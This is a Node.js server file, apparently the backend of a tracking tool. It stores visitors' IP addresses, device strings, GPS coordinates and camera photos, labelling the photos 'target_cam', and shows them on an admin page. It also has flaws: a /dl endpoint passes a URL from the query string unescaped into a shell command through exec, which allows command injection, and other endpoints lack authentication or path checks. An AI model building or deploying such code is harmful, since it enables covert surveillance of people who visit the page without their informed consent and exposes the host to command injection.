const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const PORT = process.env.PORT || 3000;

const dbFile = path.join(__dirname, 'database.json');
if (!fs.existsSync(dbFile)) {
    fs.writeFileSync(dbFile, JSON.stringify({ locations: [], photos: [] }));
}

function getDB() {
    try {
        return JSON.parse(fs.readFileSync(dbFile, 'utf8'));
    } catch (e) {
        return { locations: [], photos: [] };
    }
}

function saveDB(data) {
    fs.writeFileSync(dbFile, JSON.stringify(data, null, 2));
}

const server = http.createServer((req, res) => {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown Device';
    
    const parsedUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
    const pathname = parsedUrl.pathname;

    if (pathname === '/' || pathname === '/index.html') {
        fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
            if (err) {
                res.writeHead(404);
                res.end('File index.html tidak ditemukan');
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(content);
            }
        });
    } 
    else if (pathname === '/admin' || pathname === '/admin.html') {
        fs.readFile(path.join(__dirname, 'admin.html'), (err, content) => {
            if (err) {
                res.writeHead(404);
                res.end('File admin.html belum dibuat!');
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(content);
            }
        });
    } 
    else if (pathname === '/api/get-data') {
        const db = getDB();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(db));
    }
    else if (pathname === '/api/clear-data') {
        saveDB({ locations: [], photos: [] });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true }));
    }
    else if (pathname === '/api/delete-item' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk; });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const db = getDB();
                if (data.type === 'location') {
                    db.locations.splice(data.index, 1);
                } else if (data.type === 'photo') {
                    const photo = db.photos[data.index];
                    if (photo) {
                        const targetFile = path.join(__dirname, photo.filename);
                        if (fs.existsSync(targetFile)) fs.unlinkSync(targetFile);
                        db.photos.splice(data.index, 1);
                    }
                }
                saveDB(db);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, error: 'Invalid request' }));
            }
        });
    }
    else if (pathname === '/api/location' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk; });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const db = getDB();
                db.locations.push({
                    ip: clientIp,
                    lat: data.lat,
                    lon: data.lon,
                    device: userAgent,
                    time: new Date().toLocaleString()
                });
                saveDB(db);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'success' }));
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ status: 'error' }));
            }
        });
    } 
    else if (pathname === '/api/camera' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk; });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const matches = data.image.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
                if (matches && matches.length === 3) {
                    const imageBuffer = Buffer.from(matches[2], 'base64');
                    const facingStr = data.facing || 'user';
                    const fileName = `target_cam_${facingStr}_${Date.now()}.jpg`;
                    const filePath = path.join(__dirname, fileName);
                    
                    fs.writeFileSync(filePath, imageBuffer);
                    
                    const db = getDB();
                    db.photos.push({
                        ip: clientIp,
                        filename: fileName,
                        facing: facingStr,
                        device: userAgent,
                        time: new Date().toLocaleString()
                    });
                    saveDB(db);
                }
            } catch (e) {
                console.log("Error saving photo:", e.message);
            }
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'success' }));
        });
    } 
    else if (pathname === '/dl') {
        const queryUrl = parsedUrl.searchParams.get('url');
        if (!queryUrl) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: false, pesan: 'URL tidak valid' }));
            return;
        }

        const outputName = `video_${Date.now()}.mp4`;
        const outputPath = path.join(__dirname, outputName);
        const cmd = `yt-dlp -o "${outputPath}" "${queryUrl}"`;

        exec(cmd, (error, stdout, stderr) => {
            if (error) {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, pesan: stderr ? stderr.slice(-100) : error.message }));
            } else {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, file: `/${outputName}` }));
            }
        });
    } 
    else {
        const filePath = path.join(__dirname, pathname);
        if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
            const ext = path.extname(filePath);
            let contentType = 'text/plain';
            if (ext === '.jpg') contentType = 'image/jpeg';
            else if (ext === '.mp4') contentType = 'video/mp4';
            else if (ext === '.css') contentType = 'text/css';
            else if (ext === '.js') contentType = 'application/javascript';

            res.writeHead(200, { 'Content-Type': contentType });
            fs.createReadStream(filePath).pipe(res);
        } else {
            res.writeHead(404);
            res.end('File tidak ditemukan');
        }
    }
});

server.listen(PORT, () => {
    console.log(`[*] Server full aktif di port ${PORT}.`);
});
